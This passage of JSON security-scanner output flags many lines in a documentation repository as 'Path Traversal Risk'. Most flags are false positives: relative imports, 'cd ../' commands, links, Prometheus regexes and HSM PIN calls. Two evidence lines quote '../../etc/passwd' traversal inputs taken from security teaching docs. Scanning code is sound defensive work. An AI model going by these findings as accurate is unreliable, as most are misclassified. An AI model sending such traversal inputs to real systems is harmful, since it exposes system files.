        "evidence": "zip -r ../layer.zip .",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/testing/integration-testing/resources/REFERENCE.md",
        "line_number": 1070,
        "issue": "Path traversal pattern",
        "evidence": "import { app } from '../app';",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/testing/e2e-testing/resources/REFERENCE.md",
        "line_number": 2706,
        "issue": "Path traversal pattern",
        "evidence": "import { LoginPage } from '../../pages/LoginPage';",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/testing/e2e-testing/resources/REFERENCE.md",
        "line_number": 2775,
        "issue": "Path traversal pattern",
        "evidence": "import { LoginPage } from '../pages/LoginPage';",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/testing/e2e-testing/resources/REFERENCE.md",
        "line_number": 2776,
        "issue": "Path traversal pattern",
        "evidence": "import { DashboardPage } from '../pages/DashboardPage';",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/testing/e2e-testing/resources/REFERENCE.md",
        "line_number": 3851,
        "issue": "Path traversal pattern",
        "evidence": "import { ProductPage } from '../pages/ProductPage';",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/testing/e2e-testing/resources/REFERENCE.md",
        "line_number": 3852,
        "issue": "Path traversal pattern",
        "evidence": "import { CartPage } from '../pages/CartPage';",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/testing/e2e-testing/resources/REFERENCE.md",
        "line_number": 3853,
        "issue": "Path traversal pattern",
        "evidence": "import { CheckoutPage } from '../pages/CheckoutPage';",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/testing/e2e-testing/resources/REFERENCE.md",
        "line_number": 3898,
        "issue": "Path traversal pattern",
        "evidence": "import { test as authTest } from '../fixtures/auth';",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/protocols/websocket-protocols.md",
        "line_number": 610,
        "issue": "Path traversal pattern",
        "evidence": "cd ../examples/docker",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/protocols/mqtt-messaging.md",
        "line_number": 829,
        "issue": "Path traversal pattern",
        "evidence": "./validate_mqtt_config.py --config ../examples/mosquitto/mosquitto.conf --json",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/protocols/mqtt-messaging.md",
        "line_number": 839,
        "issue": "Path traversal pattern",
        "evidence": "cd ../examples",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/protocols/mqtt-messaging.md",
        "line_number": 860,
        "issue": "Path traversal pattern",
        "evidence": "cd ../scripts",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/protocols/kafka-streams.md",
        "line_number": 859,
        "issue": "Path traversal pattern",
        "evidence": "cd ../examples/docker",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/protocols/kafka-streams.md",
        "line_number": 870,
        "issue": "Path traversal pattern",
        "evidence": "cd ../examples/python",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/protocols/protobuf-schemas.md",
        "line_number": 739,
        "issue": "Path traversal pattern",
        "evidence": "./validate_proto_schemas.py --proto-file ../examples/user_service.proto --json",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/protocols/protobuf-schemas.md",
        "line_number": 744,
        "issue": "Path traversal pattern",
        "evidence": "./generate_proto_code.py --proto-file ../examples/user_service.proto --languages python,go --output-dir ./gen",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/protocols/protobuf-schemas.md",
        "line_number": 749,
        "issue": "Path traversal pattern",
        "evidence": "./analyze_schema_compatibility.py --old ../examples/schema_evolution/v1.proto --new ../examples/schema_evolution/v2.proto",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/protocols/grpc-implementation.md",
        "line_number": 813,
        "issue": "Path traversal pattern",
        "evidence": "./validate_proto.py --proto-file ../examples/protos/service.proto --json",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/protocols/grpc-implementation.md",
        "line_number": 818,
        "issue": "Path traversal pattern",
        "evidence": "./generate_client.py --proto-file ../examples/protos/service.proto --language python --output-dir ./client",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/protocols/grpc-implementation.md",
        "line_number": 823,
        "issue": "Path traversal pattern",
        "evidence": "cd ../examples",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/protocols/grpc-implementation.md",
        "line_number": 844,
        "issue": "Path traversal pattern",
        "evidence": "./test_grpc_server.sh --server localhost:50051 --proto-file ../examples/protos/service.proto --json",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/cryptography/signing-verification.md",
        "line_number": 781,
        "issue": "Path traversal pattern",
        "evidence": "cd ../examples/python",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/cryptography/signing-verification.md",
        "line_number": 788,
        "issue": "Path traversal pattern",
        "evidence": "cd ../",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/cryptography/encryption-at-rest.md",
        "line_number": 621,
        "issue": "Path traversal pattern",
        "evidence": "cd ../examples/python",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/cryptography/encryption-at-rest.md",
        "line_number": 628,
        "issue": "Path traversal pattern",
        "evidence": "cd ../",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/cryptography/certificate-management.md",
        "line_number": 748,
        "issue": "Path traversal pattern",
        "evidence": "cd ../examples/python",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/cryptography/certificate-management.md",
        "line_number": 755,
        "issue": "Path traversal pattern",
        "evidence": "cd ../",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/cryptography/key-management/resources/REFERENCE.md",
        "line_number": 2057,
        "issue": "User-controlled file path",
        "evidence": "with slot.open(user_pin='crypto-user:password') as session:",
        "recommendation": "Validate path is within allowed directory"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/cryptography/signing-verification/resources/REFERENCE.md",
        "line_number": 1705,
        "issue": "User-controlled file path",
        "evidence": "with token.open(user_pin='1234') as session:",
        "recommendation": "Validate path is within allowed directory"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/cryptography/signing-verification/resources/REFERENCE.md",
        "line_number": 1801,
        "issue": "User-controlled file path",
        "evidence": "session = self.token.open(user_pin=hsm_config['pin'])",
        "recommendation": "Validate path is within allowed directory"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/cryptography/signing-verification/resources/REFERENCE.md",
        "line_number": 2669,
        "issue": "User-controlled file path",
        "evidence": "session = token.open(user_pin=pin)",
        "recommendation": "Validate path is within allowed directory"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
        "line_number": 1160,
        "issue": "Path traversal pattern",
        "evidence": "cd ../intermediate",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
        "line_number": 1169,
        "issue": "Path traversal pattern",
        "evidence": "cd ../root",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
        "line_number": 1172,
        "issue": "Path traversal pattern",
        "evidence": "-in ../intermediate/csr/intermediate.csr \\",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
        "line_number": 1173,
        "issue": "Path traversal pattern",
        "evidence": "-out ../intermediate/certs/intermediate-cert.pem",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
        "line_number": 1176,
        "issue": "Path traversal pattern",
        "evidence": "cat ../intermediate/certs/intermediate-cert.pem \\",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
        "line_number": 1177,
        "issue": "Path traversal pattern",
        "evidence": "certs/ca-cert.pem > ../intermediate/certs/ca-chain.pem",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/cryptography/pki-fundamentals/resources/REFERENCE.md",
        "line_number": 1180,
        "issue": "Path traversal pattern",
        "evidence": "cd ../intermediate",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/cryptography/tls-configuration/resources/scripts/README.md",
        "line_number": 309,
        "issue": "Path traversal pattern",
        "evidence": "- `../REFERENCE.md` - Detailed TLS specifications and RFCs",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/cryptography/tls-configuration/resources/scripts/README.md",
        "line_number": 310,
        "issue": "Path traversal pattern",
        "evidence": "- `../examples/` - Example configurations",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/cryptography/tls-configuration/resources/scripts/README.md",
        "line_number": 311,
        "issue": "Path traversal pattern",
        "evidence": "- Main skill: `../../tls-configuration.md`",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/ml/huggingface/huggingface-autotrain.md",
        "line_number": 143,
        "issue": "Path traversal pattern",
        "evidence": "\"Below is an instruction...\\n\\n### Instruction:\\nWhat is Python?\\n\\n### Response:\\nPython is a programming language.\"",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/ml/huggingface/huggingface-autotrain.md",
        "line_number": 144,
        "issue": "Path traversal pattern",
        "evidence": "\"Below is an instruction...\\n\\n### Instruction:\\nExplain AI\\n\\n### Response:\\nAI stands for Artificial Intelligence.\"",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/ml/huggingface/huggingface-autotrain.md",
        "line_number": 151,
        "issue": "Path traversal pattern",
        "evidence": "\"text\": \"Below is an instruction...\\n\\n### Instruction:\\nWhat is Python?\\n\\n### Response:\\nPython is a programming language.\"",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/ml/huggingface/huggingface-autotrain.md",
        "line_number": 154,
        "issue": "Path traversal pattern",
        "evidence": "\"text\": \"Below is an instruction...\\n\\n### Instruction:\\nExplain AI\\n\\n### Response:\\nAI stands for Artificial Intelligence.\"",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/build-systems/gradle-jvm-builds.md",
        "line_number": 379,
        "issue": "Path traversal pattern",
        "evidence": "includeBuild(\"../shared-library\")",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/build-systems/cross-platform-builds.md",
        "line_number": 571,
        "issue": "Path traversal pattern",
        "evidence": "cmake -DCMAKE_TOOLCHAIN_FILE=../toolchain-arm64.cmake .. ; \\",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/security/input-validation.md",
        "line_number": 400,
        "issue": "Path traversal pattern",
        "evidence": "# Attack: filename = \"../../etc/passwd\"",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/security/vulnerability-assessment.md",
        "line_number": 51,
        "issue": "Path traversal pattern",
        "evidence": "\"https://api.example.com/files/../../etc/passwd\"",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/observability/dashboard-design.md",
        "line_number": 164,
        "issue": "Path traversal pattern",
        "evidence": "\"expr\": \"sum(rate(http_requests_total{service=\\\"api\\\",status=~\\\"5..\\\"}[5m])) / sum(rate(http_requests_total{service=\\\"api\\\"}[5m])) * 100\",",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/observability/dashboard-design.md",
        "line_number": 219,
        "issue": "Path traversal pattern",
        "evidence": "\"expr\": \"sum(rate(http_requests_total{status!~\\\"5..\\\"}[30d])) / sum(rate(http_requests_total[30d])) * 100\"",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/observability/dashboard-design.md",
        "line_number": 247,
        "issue": "Path traversal pattern",
        "evidence": "\"expr\": \"(0.001 - (1 - sum(rate(http_requests_total{status!~\\\"5..\\\"}[30d])) / sum(rate(http_requests_total[30d])))) / 0.001 * 100\"",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/observability/dashboard-design.md",
        "line_number": 276,
        "issue": "Path traversal pattern",
        "evidence": "\"expr\": \"(sum(rate(http_requests_total{status=~\\\"5..\\\"}[1h])) / sum(rate(http_requests_total[1h]))) / 0.001\",",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/observability/dashboard-design.md",
        "line_number": 280,
        "issue": "Path traversal pattern",
        "evidence": "\"expr\": \"(sum(rate(http_requests_total{status=~\\\"5..\\\"}[6h])) / sum(rate(http_requests_total[6h]))) / 0.001\",",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/observability/dashboard-design.md",
        "line_number": 322,
        "issue": "Path traversal pattern",
        "evidence": "\"expr\": \"sum by (endpoint) (rate(http_requests_total{service=\\\"api\\\",status=~\\\"5..\\\"}[5m]))\"",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/engineering/test-driven-development.md",
        "line_number": 796,
        "issue": "Path traversal pattern",
        "evidence": "--source-dir ../../../src \\",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/engineering/test-driven-development.md",
        "line_number": 797,
        "issue": "Path traversal pattern",
        "evidence": "--test-dir ../../../tests \\",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/engineering/test-driven-development.md",
        "line_number": 798,
        "issue": "Path traversal pattern",
        "evidence": "--coverage-file ../../../.coverage",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/engineering/incident-response/resources/REFERENCE.md",
        "line_number": 1376,
        "issue": "Path traversal pattern",
        "evidence": "- Dashboard: https://grafana.../payments",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/engineering/incident-response/resources/REFERENCE.md",
        "line_number": 2245,
        "issue": "Path traversal pattern",
        "evidence": "- Dashboard: https://grafana.../redis",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/engineering/incident-response/resources/REFERENCE.md",
        "line_number": 2251,
        "issue": "Path traversal pattern",
        "evidence": "- Runbook: https://docs.../db-upgrade",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/engineering/incident-response/resources/examples/runbooks/database-connection-pool-exhausted.md",
        "line_number": 410,
        "issue": "Path traversal pattern",
        "evidence": "- [2025-09-15: Connection Pool Exhaustion](../postmortems/2025-09-15-connection-pool.md)",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/engineering/incident-response/resources/examples/runbooks/database-connection-pool-exhausted.md",
        "line_number": 411,
        "issue": "Path traversal pattern",
        "evidence": "- [2025-06-22: Slow Query Impact](../postmortems/2025-06-22-slow-query.md)",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/engineering/incident-response/resources/examples/runbooks/database-connection-pool-exhausted.md",
        "line_number": 414,
        "issue": "Path traversal pattern",
        "evidence": "- [Database Connection Settings](../docs/database-config.md)",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/engineering/incident-response/resources/examples/runbooks/database-connection-pool-exhausted.md",
        "line_number": 415,
        "issue": "Path traversal pattern",
        "evidence": "- [Pool Sizing Guidelines](../docs/pool-sizing.md)",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/engineering/deployment-strategies/resources/REFERENCE.md",
        "line_number": 1580,
        "issue": "Path traversal pattern",
        "evidence": "--data-urlencode \"query=sum(rate(http_requests_total{status=~\\\"5..\\\",deployment=\\\"$DEPLOYMENT\\\"}[5m]))/sum(rate(http_requests_total{deployment=\\\"$DEPLOYMENT\\\"}[5m]))*100\" \\",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/engineering/deployment-strategies/resources/REFERENCE.md",
        "line_number": 2495,
        "issue": "Path traversal pattern",
        "evidence": "\"expr\": \"sum(rate(http_requests_total{status=~\\\"5..\\\"}[5m])) by (version) / sum(rate(http_requests_total[5m])) by (version) * 100\"",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/engineering/deployment-strategies/resources/examples/README.md",
        "line_number": 237,
        "issue": "Path traversal pattern",
        "evidence": "../scripts/validate_deployment.py --file kubernetes-blue-green.yaml",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/engineering/deployment-strategies/resources/examples/README.md",
        "line_number": 240,
        "issue": "Path traversal pattern",
        "evidence": "../scripts/test_deployment.sh --url http://localhost --duration 300",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/engineering/deployment-strategies/resources/examples/README.md",
        "line_number": 243,
        "issue": "Path traversal pattern",
        "evidence": "../scripts/execute_canary.py --platform kubernetes --service myapp --version v2.0",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/engineering/deployment-strategies/resources/examples/README.md",
        "line_number": 360,
        "issue": "Path traversal pattern",
        "evidence": "- [Main REFERENCE.md](../REFERENCE.md) - Comprehensive deployment strategies guide",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/engineering/code-review/resources/examples/checklists/security-review.md",
        "line_number": 67,
        "issue": "Path traversal pattern",
        "evidence": "- [ ] File paths are validated (no ../ sequences)",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/typed-holes-refactor/references/EXAMPLES.md",
        "line_number": 956,
        "issue": "Path traversal pattern",
        "evidence": "**Questions?** See [SKILL.md](../SKILL.md) for full methodology or [TROUBLESHOOTING.md](../SKILL.md#troubleshooting) for common issues.",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/REFERENCE.md",
        "line_number": 1218,
        "issue": "Path traversal pattern",
        "evidence": "TerraformDir: \"../examples/complete\",",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/REFERENCE.md",
        "line_number": 2330,
        "issue": "Path traversal pattern",
        "evidence": "TerraformDir: \"../examples/vpc\",",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/REFERENCE.md",
        "line_number": 2361,
        "issue": "Path traversal pattern",
        "evidence": "TerraformDir: \"../\",",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/REFERENCE.md",
        "line_number": 3504,
        "issue": "Path traversal pattern",
        "evidence": "source     = \"../modules/vpc\"",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/REFERENCE.md",
        "line_number": 3510,
        "issue": "Path traversal pattern",
        "evidence": "source     = \"../modules/vpc\"",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/REFERENCE.md",
        "line_number": 3675,
        "issue": "Path traversal pattern",
        "evidence": "source = \"../../modules/vpc\"",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/REFERENCE.md",
        "line_number": 3685,
        "issue": "Path traversal pattern",
        "evidence": "source = \"../../modules/eks\"",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/REFERENCE.md",
        "line_number": 3796,
        "issue": "Path traversal pattern",
        "evidence": "source = \"../../../modules/vpc\"",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/frontend/react-state-management.md",
        "line_number": 521,
        "issue": "Path traversal pattern",
        "evidence": "import type { RootState, AppDispatch } from '../store/store';",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/database/postgres-migrations/resources/examples/docker/README.md",
        "line_number": 50,
        "issue": "Path traversal pattern",
        "evidence": "- **Migrations**: Loaded from `../sql/safe_migrations/`",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/database/postgres-migrations/resources/examples/docker/README.md",
        "line_number": 112,
        "issue": "Path traversal pattern",
        "evidence": "-path ../sql/safe_migrations up",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/database/postgres-migrations/resources/examples/docker/README.md",
        "line_number": 116,
        "issue": "Path traversal pattern",
        "evidence": "-path ../sql/safe_migrations down 1",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/database/postgres-migrations/resources/examples/docker/README.md",
        "line_number": 127,
        "issue": "Path traversal pattern",
        "evidence": "dbmate -d ../sql/safe_migrations up",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/database/postgres-migrations/resources/examples/docker/README.md",
        "line_number": 130,
        "issue": "Path traversal pattern",
        "evidence": "dbmate -d ../sql/safe_migrations down",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/database/postgres-migrations/resources/examples/docker/README.md",
        "line_number": 143,
        "issue": "Path traversal pattern",
        "evidence": "cd ../python/alembic_migrations",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/database/postgres-query-optimization/resources/examples/docker/README.md",
        "line_number": 178,
        "issue": "Path traversal pattern",
        "evidence": "psql postgresql://testuser:testpass@localhost:5432/testdb -c \"EXPLAIN ANALYZE SELECT * FROM orders WHERE user_id = 123\" | python ../../scripts/analyze_query.py --stdin",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/database/postgres-query-optimization/resources/examples/docker/README.md",
        "line_number": 181,
        "issue": "Path traversal pattern",
        "evidence": "python ../../scripts/suggest_indexes.py --query \"SELECT * FROM orders WHERE user_id = 123 AND status = 'pending'\" --connection \"postgresql://testuser:testpass@localhost:5432/testdb\"",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/database/postgres-query-optimization/resources/examples/docker/README.md",
        "line_number": 184,
        "issue": "Path traversal pattern",
        "evidence": "./../../scripts/benchmark_queries.sh --query \"SELECT * FROM orders WHERE user_id = 123\" --connection \"postgresql://testuser:testpass@localhost:5432/testdb\" --iterations 20",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/README.md",
        "line_number": 322,
        "issue": "Path traversal pattern",
        "evidence": "- [REFERENCE.md](../REFERENCE.md) - Deep dive into EXPLAIN, planner internals, and index types",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/README.md",
        "line_number": 323,
        "issue": "Path traversal pattern",
        "evidence": "- [examples/](../examples/) - Example slow queries and optimizations",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/README.md",
        "line_number": 324,
        "issue": "Path traversal pattern",
        "evidence": "- Main skill: [postgres-query-optimization.md](../../postgres-query-optimization.md)",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/collaboration/codetour-guided-walkthroughs.md",
        "line_number": 210,
        "issue": "Path traversal pattern",
        "evidence": "print(f\"  Description: {step['description'][:100]}...\\n\")",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/mobile/react-native-navigation.md",
        "line_number": 226,
        "issue": "Path traversal pattern",
        "evidence": "import { RootStackNavigation, ProfileRouteProp } from '../types/navigation';",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/elegant-design/foundation/typography.md",
        "line_number": 290,
        "issue": "Path traversal pattern",
        "evidence": "src: '../public/fonts/jetbrains-mono.woff2',",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 2216,
        "issue": "Path traversal pattern",
        "evidence": "\u2502   \u251c\u2500\u2500 example.com.conf -> ../sites-available/example.com.conf",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 2217,
        "issue": "Path traversal pattern",
        "evidence": "\u2502   \u2514\u2500\u2500 api.example.com.conf -> ../sites-available/api.example.com.conf",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
